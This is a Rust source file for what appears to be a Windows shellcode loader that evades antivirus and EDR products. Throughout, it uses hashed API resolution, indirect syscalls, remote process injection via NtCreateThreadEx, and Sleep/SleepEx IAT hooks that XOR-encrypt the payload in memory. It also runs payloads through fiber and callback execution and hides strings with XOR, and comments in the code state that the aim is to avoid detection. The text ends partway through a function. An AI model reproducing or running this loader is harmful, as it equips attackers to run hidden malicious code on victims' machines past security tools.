#![cfg_attr(not(debug_assertions), windows_subsystem = "windows")]
#![cfg_attr(debug_assertions, windows_subsystem = "console")]
use aes_gcm::{
    aead::{Aead, KeyInit},
    Aes256Gcm, Nonce,
};
use ntapi::ntpebteb::PEB;
use std::fs;
use std::io::Read;
use std::os::windows::process::CommandExt;
use std::path::PathBuf;
use std::process::Command;
use windows_sys::Win32::Foundation::CloseHandle;
use windows_sys::Win32::System::Diagnostics::Debug::{
    AddVectoredExceptionHandler, EXCEPTION_POINTERS, IMAGE_NT_HEADERS64,
};
use windows_sys::Win32::System::LibraryLoader::GetModuleHandleA;
use windows_sys::Win32::System::Memory::{
    MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READ, PAGE_READWRITE,
};
use windows_sys::Win32::System::Registry::{
    RegCloseKey, RegOpenKeyExA, HKEY_CURRENT_USER, KEY_READ,
};
use windows_sys::Win32::System::SystemServices::{
    IMAGE_DOS_HEADER, IMAGE_DOS_SIGNATURE, IMAGE_IMPORT_BY_NAME, IMAGE_IMPORT_DESCRIPTOR,
    IMAGE_NT_SIGNATURE,
};
use windows_sys::Win32::System::Threading::GetCurrentThreadId;

static mut SLEEP_ORIGINAL: usize = 0;
static mut SLEEP_EX_ORIGINAL: usize = 0;
static mut SC_ADDR: usize = 0;
static mut SC_SIZE: usize = 0;
static mut SC_THREAD_ID: u32 = 0;
static mut SSN_PROTECT: u32 = 0;
static mut ADDR_PROTECT: usize = 0;
static mut MAIN_FIBER: *mut core::ffi::c_void = core::ptr::null_mut();
static mut ENC_KEY: u8 = 0;

const CREATE_NO_WINDOW: u32 = 0x08000000;

// Custom Hash Constants (Seed: 0xABCDEF12, Algo: ((hash << 5) + hash) ^ byte)
const HASH_NT_WAIT_FOR_SINGLE_OBJECT: u32 = 0x5b0d0c77;
const HASH_NT_ALLOCATE_VIRTUAL_MEMORY: u32 = 0x84eaeed5;
const HASH_NT_WRITE_VIRTUAL_MEMORY: u32 = 0xb5390f35;
const HASH_NT_PROTECT_VIRTUAL_MEMORY: u32 = 0x818b9ac3;
const HASH_NT_CREATE_THREAD_EX: u32 = 0xe322cf9f;
const HASH_NT_OPEN_PROCESS: u32 = 0x96103057;
const HASH_NT_DELAY_EXECUTION: u32 = 0x5350928f;

const MARKER: &[u8] = b"2048KB\0";

#[allow(dead_code)]
const HASH_KERNEL32: u32 = 0x00000000;
#[allow(dead_code)]
const HASH_VIRTUAL_PROTECT: u32 = 0x00000000; // Not used/recalculated
#[allow(dead_code)]
const HASH_CREATE_THREAD: u32 = 0x00000000; // Not used/recalculated
#[allow(dead_code)]
const HASH_WAIT_FOR_SINGLE_OBJECT: u32 = 0x00000000; // Not used/recalculated
#[allow(dead_code)]
const HASH_SLEEP: u32 = 0xb934e9fd;

#[allow(dead_code)]
const HASH_CREATE_THREADPOOL_WORK: u32 = 0x960e4905;
#[allow(dead_code)]
const HASH_SUBMIT_THREADPOOL_WORK: u32 = 0x3bb896d5;
#[allow(dead_code)]
const HASH_WAIT_FOR_THREADPOOL_WORK_CALLBACKS: u32 = 0x56f004b;
#[allow(dead_code)]
const HASH_CLOSE_THREADPOOL_WORK: u32 = 0xdf751f57;
#[allow(dead_code)]
const HASH_ENUM_SYSTEM_LOCALES_A: u32 = 0x24ad7fe;
const HASH_CONVERT_THREAD_TO_FIBER: u32 = 0x32eec10a;
const HASH_CREATE_FIBER: u32 = 0xfc6ccfec;
const HASH_SWITCH_TO_FIBER: u32 = 0x1a237841;

const EXCEPTION_ACCESS_VIOLATION: i32 = 0xC0000005u32 as i32;
const EXCEPTION_CONTINUE_EXECUTION: i32 = -1;
const EXCEPTION_CONTINUE_SEARCH: i32 = 0;

/*
type FnVirtualProtect = unsafe extern "system" fn(
    lpAddress: *mut core::ffi::c_void,
    dwSize: usize,
    flNewProtect: u32,
    lpflOldProtect: *mut u32,
) -> i32;
*/
use windows_sys::Win32::System::Memory::VirtualProtect;

#[allow(dead_code)]
type FnCreateThread = unsafe extern "system" fn(
    lp_thread_attributes: *const core::ffi::c_void,
    dw_stack_size: usize,
    lp_start_address: Option<unsafe extern "system" fn(*mut core::ffi::c_void) -> u32>,
    lp_parameter: *mut core::ffi::c_void,
    dw_creation_flags: u32,
    lp_thread_id: *mut u32,
) -> isize;

#[allow(dead_code)]
type FnWaitForSingleObject =
    unsafe extern "system" fn(h_handle: isize, dw_milliseconds: u32) -> u32;
#[allow(dead_code)]
type FnSleep = unsafe extern "system" fn(dw_milliseconds: u32);
#[allow(dead_code)]
type FnSleepEx = unsafe extern "system" fn(dw_milliseconds: u32, b_alertable: i32) -> u32;

#[allow(dead_code)]
type FnCreateThreadpoolWork = unsafe extern "system" fn(
    pfnwk: unsafe extern "system" fn(
        instance: *mut core::ffi::c_void,
        context: *mut core::ffi::c_void,
        work: *mut core::ffi::c_void,
    ),
    pv: *mut core::ffi::c_void,
    pcbe: *mut core::ffi::c_void,
) -> isize;

#[allow(dead_code)]
type FnSubmitThreadpoolWork = unsafe extern "system" fn(pwk: isize);

#[allow(dead_code)]
type FnWaitForThreadpoolWorkCallbacks =
    unsafe extern "system" fn(pwk: isize, fcancelpendingcallbacks: i32);

#[allow(dead_code)]
type FnCloseThreadpoolWork = unsafe extern "system" fn(pwk: isize);

#[allow(dead_code)]
type FnEnumSystemLocalesA =
    unsafe extern "system" fn(lp_locale_enum_proc: *mut core::ffi::c_void, dw_flags: u32) -> i32;

#[allow(dead_code)]
type FnConvertThreadToFiber =
    unsafe extern "system" fn(lp_parameter: *mut core::ffi::c_void) -> *mut core::ffi::c_void;
#[allow(dead_code)]
type FnCreateFiber = unsafe extern "system" fn(
    dw_stack_size: usize,
    lp_start_address: unsafe extern "system" fn(lp_parameter: *mut core::ffi::c_void),
    lp_parameter: *mut core::ffi::c_void,
) -> *mut core::ffi::c_void;
#[allow(dead_code)]
type FnSwitchToFiber = unsafe extern "system" fn(lp_fiber: *mut core::ffi::c_void);

// --- Utils ---

fn djb2(s: &[u8]) -> u32 {
    let mut hash: u32 = 0xABCDEF12;
    for &b in s {
        // hash = ((hash << 5) + hash) ^ b
        hash = ((hash << 5).wrapping_add(hash)) ^ (b as u32);
    }
    hash
}

#[cfg(target_arch = "x86_64")]
unsafe fn get_ntdll_base() -> usize {
    let peb: *const u8;
    core::arch::asm!("mov {}, gs:[0x60]", out(reg) peb);
    let ldr = *(peb.add(0x18) as *const *const u8);
    let mut entry = *(ldr.add(0x20) as *const *const u8); // InMemoryOrderModuleList

    loop {
        let dll_base = *(entry.add(0x20) as *const usize);
        let name_len = *(entry.add(0x48) as *const u16);
        let name_buf = *(entry.add(0x50) as *const *const u16);

        if !name_buf.is_null() {
            let name_slice = core::slice::from_raw_parts(name_buf, (name_len / 2) as usize);
            let s = String::from_utf16_lossy(name_slice);
            // XOR deobfuscation for "ntdll.dll" with 0x33
            let mut target = [0u8; 9];
            target[0] = b'n' ^ 0x33;
            target[1] = b't' ^ 0x33;
            target[2] = b'd' ^ 0x33;
            target[3] = b'l' ^ 0x33;
            target[4] = b'l' ^ 0x33;
            target[5] = b'.' ^ 0x33;
            target[6] = b'd' ^ 0x33;
            target[7] = b'l' ^ 0x33;
            target[8] = b'l' ^ 0x33;

            let mut s_lower = s.to_ascii_lowercase();
            let mut s_bytes = s_lower.into_bytes();
            for b in s_bytes.iter_mut() {
                *b ^= 0x33;
            }

            if s_bytes.len() == 9 && s_bytes == target {
                return dll_base;
            }
        }

        entry = *(entry as *const *const u8);
        if entry == *(ldr.add(0x20) as *const *const u8) {
            break;
        }
    }
    0
}

unsafe fn get_export_addr(base: usize, hash: u32) -> Option<usize> {
    let dos_header = base as *const u8;
    let e_lfanew = *(dos_header.add(0x3C) as *const u32) as usize;
    let nt_headers = dos_header.add(e_lfanew);
    let export_rva = *(nt_headers.add(0x88) as *const u32) as usize;
    if export_rva == 0 {
        return None;
    }

    let export_dir = dos_header.add(export_rva);
    let num_names = *(export_dir.add(0x18) as *const u32) as usize;
    let addr_funcs = *(export_dir.add(0x1C) as *const u32) as usize;
    let addr_names = *(export_dir.add(0x20) as *const u32) as usize;
    let addr_ords = *(export_dir.add(0x24) as *const u32) as usize;

    let names = dos_header.add(addr_names) as *const u32;
    let ords = dos_header.add(addr_ords) as *const u16;
    let funcs = dos_header.add(addr_funcs) as *const u32;

    for i in 0..num_names {
        let name_rva = *names.add(i) as usize;
        let name_ptr = dos_header.add(name_rva);
        let mut len = 0;
        while *name_ptr.add(len) != 0 {
            len += 1;
        }
        let name_slice = core::slice::from_raw_parts(name_ptr, len);

        if djb2(name_slice) == hash {
            let ord = *ords.add(i) as usize;
            let func_rva = *funcs.add(ord) as usize;
            return Some(base + func_rva);
        }
    }
    None
}

// --- Indirect Syscall ---
// Returns (SSN, SyscallInstAddr)
unsafe fn get_ssn_indirect(hash: u32) -> Option<(u32, usize)> {
    let ntdll = get_ntdll_base();
    if ntdll == 0 {
        return None;
    }

    let addr = get_export_addr(ntdll, hash)?;
    let ptr = addr as *const u8;

    for i in 0..32 {
        // Obfuscated check for 0xB8 (mov eax, imm32)
        // 0xB8 ^ 0x33 = 0x8B
        if (*ptr.add(i) ^ 0x33) == 0x8B {
            // mov eax, SSN
            let ssn = *(ptr.add(i + 1) as *const u32);
            // Look for 'syscall; ret' (0F 05 C3)
            // 0x0F ^ 0x33 = 0x3C
            // 0x05 ^ 0x33 = 0x36
            // 0xC3 ^ 0x33 = 0xF0
            for j in 0..32 {
                if (*ptr.add(i + j) ^ 0x33) == 0x3C
                    && (*ptr.add(i + j + 1) ^ 0x33) == 0x36
                    && (*ptr.add(i + j + 2) ^ 0x33) == 0xF0
                {
                    return Some((ssn, (ptr.add(i + j) as usize)));
                }
            }
        }
    }
    None
}

#[cfg(all(target_os = "windows", target_arch = "x86_64"))]
unsafe fn syscall(
    ssn: u32,
    syscall_addr: usize,
    a1: usize,
    a2: usize,
    a3: usize,
    a4: usize,
    a5: usize,
    a6: usize,
    a7: usize,
    a8: usize,
    a9: usize,
    a10: usize,
    a11: usize,
) -> i32 {
    let ret: i32;
    core::arch::asm!(
        "sub rsp, 0x88",
        "nop",
        "mov [rsp + 0x20], {a5}", "mov [rsp + 0x28], {a6}", "mov [rsp + 0x30], {a7}",
        "mov [rsp + 0x38], {a8}", "mov [rsp + 0x40], {a9}", "mov [rsp + 0x48], {a10}",
        "mov [rsp + 0x50], {a11}",
        "mov eax, {ssn:e}",
        "nop",
        "call {syscall_addr}",
        "nop",
        "add rsp, 0x88",
        in("r10") a1, in("rdx") a2, in("r8") a3, in("r9") a4,
        a5 = in(reg) a5, a6 = in(reg) a6, a7 = in(reg) a7, a8 = in(reg) a8,
        a9 = in(reg) a9, a10 = in(reg) a10, a11 = in(reg) a11, ssn = in(reg) ssn, syscall_addr = in(reg) syscall_addr,
        lateout("rax") ret, lateout("rcx") _, lateout("r11") _,
        options(nostack)
    );
    ret
}

#[cfg(not(all(target_os = "windows", target_arch = "x86_64")))]
unsafe fn syscall(
    _ssn: u32,
    _syscall_addr: usize,
    _a1: usize,
    _a2: usize,
    _a3: usize,
    _a4: usize,
    _a5: usize,
    _a6: usize,
    _a7: usize,
    _a8: usize,
    _a9: usize,
    _a10: usize,
    _a11: usize,
) -> i32 {
    0
}

#[repr(C)]
#[allow(non_snake_case)]
#[allow(non_camel_case_types)]
struct OBJECT_ATTRIBUTES {
    Length: u32,
    RootDirectory: isize,
    ObjectName: isize,
    Attributes: u32,
    SecurityDescriptor: isize,
    SecurityQualityOfService: isize,
}

#[repr(C)]
#[allow(non_snake_case)]
#[allow(non_camel_case_types)]
struct CLIENT_ID {
    UniqueProcess: isize,
    UniqueThread: isize,
}

unsafe fn exec_remote(sc: &[u8], path: &str) {
    let child = std::process::Command::new(path)
        .creation_flags(CREATE_NO_WINDOW)
        .spawn();
    let Ok(child) = child else { return };
    let pid = child.id();

    let (ssn_open, addr_open) = get_ssn_indirect(HASH_NT_OPEN_PROCESS).unwrap_or((0x26, 0));
    let (ssn_alloc, addr_alloc) =
        get_ssn_indirect(HASH_NT_ALLOCATE_VIRTUAL_MEMORY).unwrap_or((0x18, 0));
    let (ssn_write, addr_write) =
        get_ssn_indirect(HASH_NT_WRITE_VIRTUAL_MEMORY).unwrap_or((0x3A, 0));
    let (ssn_protect, addr_protect) =
        get_ssn_indirect(HASH_NT_PROTECT_VIRTUAL_MEMORY).unwrap_or((0x50, 0));
    let (ssn_create, addr_create) = get_ssn_indirect(HASH_NT_CREATE_THREAD_EX).unwrap_or((0xBD, 0));
    let (ssn_wait, addr_wait) =
        get_ssn_indirect(HASH_NT_WAIT_FOR_SINGLE_OBJECT).unwrap_or((0x4, 0));

    if addr_open == 0 {
        return;
    }

    let mut h_proc: isize = 0;
    let mut oa: OBJECT_ATTRIBUTES = core::mem::zeroed();
    oa.Length = core::mem::size_of::<OBJECT_ATTRIBUTES>() as u32;
    let mut cid = CLIENT_ID {
        UniqueProcess: pid as isize,
        UniqueThread: 0,
    };

    let st_open = syscall(
        ssn_open,
        addr_open,
        &mut h_proc as *mut _ as usize,
        0x1FFFFF,
        &mut oa as *mut _ as usize,
        &mut cid as *mut _ as usize,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
    );
    if st_open != 0 || h_proc == 0 {
        return;
    }

    let mut base: *mut core::ffi::c_void = core::ptr::null_mut();
    let mut size = sc.len();
    let _ = syscall(
        ssn_alloc,
        addr_alloc,
        h_proc as usize,
        &mut base as *mut _ as usize,
        0,
        &mut size as *mut _ as usize,
        (MEM_COMMIT | MEM_RESERVE) as usize,
        PAGE_READWRITE as usize,
        0,
        0,
        0,
        0,
        0,
    );

    if !base.is_null() {
        let mut written = 0usize;
        let _ = syscall(
            ssn_write,
            addr_write,
            h_proc as usize,
            base as usize,
            sc.as_ptr() as usize,
            sc.len(),
            &mut written as *mut _ as usize,
            0,
            0,
            0,
            0,
            0,
            0,
        );
        let mut old = 0usize;
        let _ = syscall(
            ssn_protect,
            addr_protect,
            h_proc as usize,
            &mut base as *mut _ as usize,
            &mut size as *mut _ as usize,
            PAGE_EXECUTE_READ as usize,
            &mut old as *mut _ as usize,
            0,
            0,
            0,
            0,
            0,
            0,
        );
        let mut h_thread: isize = 0;
        let st_thr = syscall(
            ssn_create,
            addr_create,
            &mut h_thread as *mut _ as usize,
            0x1FFFFF,
            0,
            h_proc as usize,
            base as usize,
            0,
            0,
            0,
            0,
            0,
            0,
        );
        println!("CreateThread status: {:x}, handle: {:x}", st_thr, h_thread);
        if st_thr == 0 && h_thread != 0 {
            println!("Waiting for thread...");
            let _ = syscall(
                ssn_wait,
                addr_wait,
                h_thread as usize,
                0,
                0,
                0,
                0,
                0,
                0,
                0,
                0,
                0,
                0,
            );
            println!("Thread finished or wait returned");
            CloseHandle(h_thread);
        } else {
            println!("CreateThread failed");
        }
    } else {
        println!("Allocation failed");
    }
    CloseHandle(h_proc);
}

unsafe fn hook_iat(target_dll: &str, target_func: &str, new_func: usize) -> Option<usize> {
    let base = GetModuleHandleA(core::ptr::null());
    if base == 0 {
        return None;
    }

    let dos_header = base as *const IMAGE_DOS_HEADER;
    if (*dos_header).e_magic != IMAGE_DOS_SIGNATURE {
        return None;
    }

    let nt_headers = (base as usize + (*dos_header).e_lfanew as usize) as *const IMAGE_NT_HEADERS64;
    if (*nt_headers).Signature != IMAGE_NT_SIGNATURE {
        return None;
    }

    // IMAGE_DIRECTORY_ENTRY_IMPORT = 1
    let import_dir = (*nt_headers).OptionalHeader.DataDirectory[1];
    if import_dir.VirtualAddress == 0 {
        return None;
    }

    let mut import_desc =
        (base as usize + import_dir.VirtualAddress as usize) as *const IMAGE_IMPORT_DESCRIPTOR;

    while (*import_desc).Name != 0 {
        let name_ptr = (base as usize + (*import_desc).Name as usize) as *const u8;
        let name_len = (0..).find(|&i| *name_ptr.add(i) == 0).unwrap();
        let name_slice = core::slice::from_raw_parts(name_ptr, name_len);
        let name = String::from_utf8_lossy(name_slice);

        if name.eq_ignore_ascii_case(target_dll) {
            let mut thunk = (base as usize + (*import_desc).FirstThunk as usize) as *mut u64;
            let mut orig_thunk = (base as usize
                + (*import_desc).Anonymous.OriginalFirstThunk as usize)
                as *const u64;
            if (*import_desc).Anonymous.OriginalFirstThunk == 0 {
                orig_thunk = thunk as *const _;
            }

            while *orig_thunk != 0 {
                if *orig_thunk & 0x8000_0000_0000_0000 == 0 {
                    // Not ordinal
                    let import_by_name =
                        (base as usize + *orig_thunk as usize) as *const IMAGE_IMPORT_BY_NAME;
                    let func_name_ptr = &(*import_by_name).Name as *const u8;
                    let func_len = (0..).find(|&i| *func_name_ptr.add(i) == 0).unwrap();
                    let func_slice = core::slice::from_raw_parts(func_name_ptr, func_len);
                    let func_str = String::from_utf8_lossy(func_slice);

                    if func_str.eq_ignore_ascii_case(target_func) {
                        let original = *thunk as usize;
                        let mut old_prot = 0;
                        let mut size = 8usize;
                        let mut addr = thunk as usize;

                        if SSN_PROTECT != 0 && ADDR_PROTECT != 0 {
                            syscall(
                                SSN_PROTECT,
                                ADDR_PROTECT,
                                -1isize as usize,
                                &mut addr as *mut _ as usize,
                                &mut size as *mut _ as usize,
                                PAGE_READWRITE as usize,
                                &mut old_prot as *mut _ as usize,
                                0,
                                0,
                                0,
                                0,
                                0,
                                0,
                            );
                        } else {
                            VirtualProtect(thunk as *mut _, 8, PAGE_READWRITE, &mut old_prot);
                        }

                        *thunk = new_func as u64;

                        if SSN_PROTECT != 0 && ADDR_PROTECT != 0 {
                            syscall(
                                SSN_PROTECT,
                                ADDR_PROTECT,
                                -1isize as usize,
                                &mut addr as *mut _ as usize,
                                &mut size as *mut _ as usize,
                                old_prot as usize,
                                &mut old_prot as *mut _ as usize,
                                0,
                                0,
                                0,
                                0,
                                0,
                                0,
                            );
                        } else {
                            VirtualProtect(thunk as *mut _, 8, old_prot, &mut old_prot);
                        }

                        return Some(original);
                    }
                }
                thunk = thunk.add(1);
                orig_thunk = orig_thunk.add(1);
            }
        }
        import_desc = import_desc.add(1);
    }
    None
}

unsafe fn get_kernel32_base() -> usize {
    use windows_sys::Win32::System::LibraryLoader::GetModuleHandleA;
    // "kernel32.dll" ^ 0x44
    let mut k32 = [
        b'k' ^ 0x44,
        b'e' ^ 0x44,
        b'r' ^ 0x44,
        b'n' ^ 0x44,
        b'e' ^ 0x44,
        b'l' ^ 0x44,
        b'3' ^ 0x44,
        b'2' ^ 0x44,
        b'.' ^ 0x44,
        b'd' ^ 0x44,
        b'l' ^ 0x44,
        b'l' ^ 0x44,
        0,
    ];
    for b in k32.iter_mut() {
        if *b != 0 {
            *b ^= 0x44;
        }
    }
    let h = GetModuleHandleA(k32.as_ptr());
    if h != 0 {
        return h as usize;
    }
    0
}

unsafe extern "system" fn sleep_detour(dw_milliseconds: u32) {
    let do_fluctuation = SC_ADDR != 0 && SC_SIZE != 0 && GetCurrentThreadId() == SC_THREAD_ID;

    if do_fluctuation {
        // RW
        let mut old_prot = 0;
        let base = SC_ADDR as *mut core::ffi::c_void;
        let mut size = SC_SIZE;

        if SSN_PROTECT != 0 && ADDR_PROTECT != 0 {
            syscall(
                SSN_PROTECT,
                ADDR_PROTECT,
                0xffffffffffffffff,                      // Current Process (-1)
                &mut (base as usize) as *mut _ as usize, // *BaseAddress
                &mut size as *mut _ as usize,            // *RegionSize
                PAGE_READWRITE as usize,                 // NewProtect
                &mut old_prot as *mut _ as usize,        // *OldProtect
                0,
                0,
                0,
                0,
                0,
                0,
            );
        } else {
            VirtualProtect(base, size, PAGE_READWRITE, &mut old_prot);
        }

        // Encrypt
        let slice = core::slice::from_raw_parts_mut(SC_ADDR as *mut u8, SC_SIZE);
        let key = if ENC_KEY == 0 { 0xAA } else { ENC_KEY };
        for b in slice.iter_mut() {
            *b ^= key;
        }
    }

    if SLEEP_ORIGINAL != 0 {
        let original: unsafe extern "system" fn(u32) = core::mem::transmute(SLEEP_ORIGINAL);
        original(dw_milliseconds);
    }

    if do_fluctuation {
        // Decrypt
        let slice = core::slice::from_raw_parts_mut(SC_ADDR as *mut u8, SC_SIZE);
        let key = if ENC_KEY == 0 { 0xAA } else { ENC_KEY };
        for b in slice.iter_mut() {
            *b ^= key;
        }

        // RX/RWX
        let mut old_prot = 0;
        let base = SC_ADDR as *mut core::ffi::c_void;
        let mut size = SC_SIZE;

        if SSN_PROTECT != 0 && ADDR_PROTECT != 0 {
            syscall(
                SSN_PROTECT,
                ADDR_PROTECT,
                0xffffffffffffffff,
                &mut (base as usize) as *mut _ as usize,
                &mut size as *mut _ as usize,
                PAGE_EXECUTE_READ as usize,
                &mut old_prot as *mut _ as usize,
                0,
                0,
                0,
                0,
                0,
                0,
            );
        } else {
            VirtualProtect(base, size, PAGE_EXECUTE_READ, &mut old_prot);
        }
    }
}

unsafe extern "system" fn sleep_ex_detour(dw_milliseconds: u32, b_alertable: i32) -> u32 {
    let do_fluctuation = SC_ADDR != 0 && SC_SIZE != 0 && GetCurrentThreadId() == SC_THREAD_ID;

    if do_fluctuation {
        let mut old_prot = 0;
        let base = SC_ADDR as *mut core::ffi::c_void;
        let mut size = SC_SIZE;

        if SSN_PROTECT != 0 && ADDR_PROTECT != 0 {
            syscall(
                SSN_PROTECT,
                ADDR_PROTECT,
                0xffffffffffffffff,
                &mut (base as usize) as *mut _ as usize,
                &mut size as *mut _ as usize,
                PAGE_READWRITE as usize,
                &mut old_prot as *mut _ as usize,
                0,
                0,
                0,
                0,
                0,
                0,
            );
        } else {
            VirtualProtect(base, size, PAGE_READWRITE, &mut old_prot);
        }

        let slice = core::slice::from_raw_parts_mut(SC_ADDR as *mut u8, SC_SIZE);
        let key = if ENC_KEY == 0 { 0xAA } else { ENC_KEY };
        for b in slice.iter_mut() {
            *b ^= key;
        }
    }

    let ret = if SLEEP_EX_ORIGINAL != 0 {
        let original: unsafe extern "system" fn(u32, i32) -> u32 =
            core::mem::transmute(SLEEP_EX_ORIGINAL);
        original(dw_milliseconds, b_alertable)
    } else {
        0
    };

    if do_fluctuation {
        let slice = core::slice::from_raw_parts_mut(SC_ADDR as *mut u8, SC_SIZE);
        let key = if ENC_KEY == 0 { 0xAA } else { ENC_KEY };
        for b in slice.iter_mut() {
            *b ^= key;
        }

        let mut old_prot = 0;
        let base = SC_ADDR as *mut core::ffi::c_void;
        let mut size = SC_SIZE;

        if SSN_PROTECT != 0 && ADDR_PROTECT != 0 {
            syscall(
                SSN_PROTECT,
                ADDR_PROTECT,
                0xffffffffffffffff,
                &mut (base as usize) as *mut _ as usize,
                &mut size as *mut _ as usize,
                PAGE_EXECUTE_READ as usize,
                &mut old_prot as *mut _ as usize,
                0,
                0,
                0,
                0,
                0,
                0,
            );
        } else {
            VirtualProtect(base, size, PAGE_EXECUTE_READ, &mut old_prot);
        }
    }
    ret
}

unsafe fn clean_environment_block() {
    let peb: *mut PEB;
    #[cfg(target_arch = "x86_64")]
    {
        core::arch::asm!("mov {}, gs:[0x60]", out(reg) peb);
    }
    #[cfg(target_arch = "x86")]
    {
        core::arch::asm!("mov {}, fs:[0x30]", out(reg) peb);
    }

    if peb.is_null() {
        return;
    }
    let params = (*peb).ProcessParameters;
    if params.is_null() {
        return;
    }

    let env = (*params).Environment as *mut u16;
    if env.is_null() {
        return;
    }

    let mut read_ptr = env;
    let mut write_ptr = env;

    loop {
        if *read_ptr == 0 {
            break;
        }

        let mut len = 0;
        while *read_ptr.add(len) != 0 {
            len += 1;
        }

        let s_slice = core::slice::from_raw_parts(read_ptr, len);
        let s = String::from_utf16_lossy(s_slice);
        let key = s.split('=').next().unwrap_or("");
        let key_upper = key.to_uppercase();

        let keep = matches!(
            key_upper.as_str(),
            "SYSTEMROOT"
                | "SYSTEMDRIVE"
                | "WINDIR"
                | "PROGRAMDATA"
                | "PROGRAMFILES"
                | "PROGRAMFILES(X86)"
                | "COMMONPROGRAMFILES"
                | "COMMONPROGRAMFILES(X86)"
                | "COMSPEC"
                | "TEMP"
                | "TMP"
                | "USERNAME"
                | "USERPROFILE"
                | "ALLUSERSPROFILE"
                | "APPDATA"
                | "LOCALAPPDATA"
                | "PUBLIC"
        );

        if keep {
            if read_ptr != write_ptr {
                core::ptr::copy(read_ptr, write_ptr, len + 1);
            }
            write_ptr = write_ptr.add(len + 1);
        } else if key_upper == "PATH" {
            let clean_val = "Path=C:\\Windows\\system32;C:\\Windows\0"
                .encode_utf16()
                .collect::<Vec<u16>>();
            if clean_val.len() <= len + 1 {
                core::ptr::copy_nonoverlapping(clean_val.as_ptr(), write_ptr, clean_val.len());
                write_ptr = write_ptr.add(clean_val.len());
            }
        }

        read_ptr = read_ptr.add(len + 1);
    }

    *write_ptr = 0;
    let remaining = (read_ptr as usize).saturating_sub(write_ptr as usize);
    if remaining > 0 {
        core::ptr::write_bytes(write_ptr.add(1), 0, remaining / 2);
    }
}

#[allow(dead_code)]
fn api_hammering() {
    unsafe { clean_environment_block() };

    // Replace HeapAlloc loop with math calculation to avoid Heuristic detection
    let mut x: u64 = 0xDEADBEEF;
    let mut y: u64 = 0xCAFEBABE;
    for _ in 0..10000 {
        x = x.wrapping_mul(y).wrapping_add(1);
        y = y.wrapping_add(x).wrapping_sub(12345);
        core::hint::black_box(x);
    }
}

unsafe extern "system" fn veh_guard(exception_info: *mut EXCEPTION_POINTERS) -> i32 {
    if exception_info.is_null() {
        return EXCEPTION_CONTINUE_SEARCH;
    }

    let record = &*(*exception_info).ExceptionRecord;
    if record.ExceptionCode == EXCEPTION_ACCESS_VIOLATION {
        let violation_type = record.ExceptionInformation[0]; // 0=Read, 1=Write, 8=Exec
        let addr = record.ExceptionInformation[1]; // Target Address

        // Check global SC_ADDR/SC_SIZE
        if SC_ADDR != 0 && SC_SIZE != 0 {
            let start = SC_ADDR;
            let end = SC_ADDR + SC_SIZE;

            // Check if address is within shellcode region
            if addr >= start && addr < end {
                let mut old = 0;
                let mut size = SC_SIZE;
                let base = SC_ADDR as *mut core::ffi::c_void;

                // If it's an Execution Violation (8), it means we are RW/NoAccess, need RX
                // DEP Violation
                if violation_type == 8 {
                    // Capture Thread ID for sleep obfuscation if not set
                    if SC_THREAD_ID == 0 {
                        SC_THREAD_ID = GetCurrentThreadId();
                    }

                    if SSN_PROTECT != 0 && ADDR_PROTECT != 0 {
                        // Syscall Protect RX
                        syscall(
                            SSN_PROTECT,
                            ADDR_PROTECT,
                            0xffffffffffffffff,
                            &mut (base as usize) as *mut _ as usize,
                            &mut size as *mut _ as usize,
                            PAGE_EXECUTE_READ as usize,
                            &mut old as *mut _ as usize,
                            0,
                            0,
                            0,
                            0,
                            0,
                            0,
                        );
                    } else {
                        VirtualProtect(base, size, PAGE_EXECUTE_READ, &mut old);
                    }
                    return EXCEPTION_CONTINUE_EXECUTION;
                }

                // If it's a Write Violation (1), it means we are RX, need RW (or RWX for mixed code)
                // Self-Modifying Code Support
                if violation_type == 1 {
                    // Capture Thread ID if not set (just in case)
                    if SC_THREAD_ID == 0 {
                        SC_THREAD_ID = GetCurrentThreadId();
                    }

                    // Optimization: Use RWX to prevent thrashing (infinite loop of RW <-> RX)
                    // If we just set RW, the next fetch (Exec) will trigger DEP (Exec Violation).
                    // Then we set RX. Then the next Write triggers Write Violation.
                    // This ping-pong kills performance.
                    // Setting RWX allows both.
                    const PAGE_EXECUTE_READWRITE: u32 = 0x40;

                    if SSN_PROTECT != 0 && ADDR_PROTECT != 0 {
                        // Syscall Protect RWX
                        syscall(
                            SSN_PROTECT,
                            ADDR_PROTECT,
                            0xffffffffffffffff,
                            &mut (base as usize) as *mut _ as usize,
                            &mut size as *mut _ as usize,
                            PAGE_EXECUTE_READWRITE as usize,
                            &mut old as *mut _ as usize,
                            0,
                            0,
                            0,
                            0,
                            0,
                            0,
                        );
                    } else {
                        VirtualProtect(base, size, PAGE_EXECUTE_READWRITE, &mut old);
                    }
                    return EXCEPTION_CONTINUE_EXECUTION;
                }
            }
        }
    }
    EXCEPTION_CONTINUE_SEARCH
}

unsafe extern "system" fn fiber_start(param: *mut core::ffi::c_void) {
    SC_THREAD_ID = GetCurrentThreadId();
    let code: unsafe extern "system" fn() = core::mem::transmute(param);

    // Global VEH handler (veh_guard) registered in main handles exceptions/execution
    code();

    // If shellcode returns, switch back to main fiber
    if !MAIN_FIBER.is_null() {
        let k32 = get_kernel32_base();
        if let Some(addr_switch) = get_export_addr(k32, HASH_SWITCH_TO_FIBER) {
            let switch: FnSwitchToFiber = core::mem::transmute(addr_switch);
            switch(MAIN_FIBER);
        }
    }
}

unsafe fn exec_threadpool(base: *mut core::ffi::c_void, _size: usize) -> bool {
    let k32 = get_kernel32_base();

    // Attempt 1: EnumSystemLocalesA (Synchronous Callback)
    // This is better for VEH handling as it runs in the current thread context
    let addr_enum = get_export_addr(k32, HASH_ENUM_SYSTEM_LOCALES_A);
    if let Some(a_enum) = addr_enum {
        let enum_locales: FnEnumSystemLocalesA = core::mem::transmute(a_enum);
        println!("Executing via EnumSystemLocalesA callback...");
        enum_locales(base, 0);
        println!("EnumSystemLocalesA returned.");
        return true;
    }

    // Fallback: Threadpool (Asynchronous)
    let addr_create = get_export_addr(k32, HASH_CREATE_THREADPOOL_WORK);
    let addr_submit = get_export_addr(k32, HASH_SUBMIT_THREADPOOL_WORK);
    let addr_wait = get_export_addr(k32, HASH_WAIT_FOR_THREADPOOL_WORK_CALLBACKS);
    let addr_close = get_export_addr(k32, HASH_CLOSE_THREADPOOL_WORK);

    if let (Some(a_create), Some(a_submit), Some(a_wait), Some(a_close)) =
        (addr_create, addr_submit, addr_wait, addr_close)
    {
        let create: FnCreateThreadpoolWork = core::mem::transmute(a_create);
        let submit: FnSubmitThreadpoolWork = core::mem::transmute(a_submit);
        let wait: FnWaitForThreadpoolWorkCallbacks = core::mem::transmute(a_wait);
